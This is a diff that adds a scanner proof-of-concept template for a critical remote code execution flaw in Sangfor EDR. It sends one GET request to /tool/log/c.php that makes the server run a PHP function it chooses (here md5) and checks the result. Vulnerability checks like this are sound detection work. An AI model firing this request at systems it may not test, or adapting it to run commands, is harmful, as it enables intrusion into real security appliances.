@@ -1,0 +1,16 @@
+id: poc-yaml-sangfor-edr-rce
+info:
+  name: Sangfor EDR 远程代码执行漏洞
+  severity: critical
+  tags:
+  - rce
+  finger: Sangfor
+  osprey-id: vb_2020_0060
+requests:
+- method: GET
+  path: /tool/log/c.php?strip_slashes=md5&host=2222
+  expression: 'status_code == 200 && contains(body, "934b535800b1cba8f96a5d72f72f1611")
+
+    '
+variables: {}
+transport: http
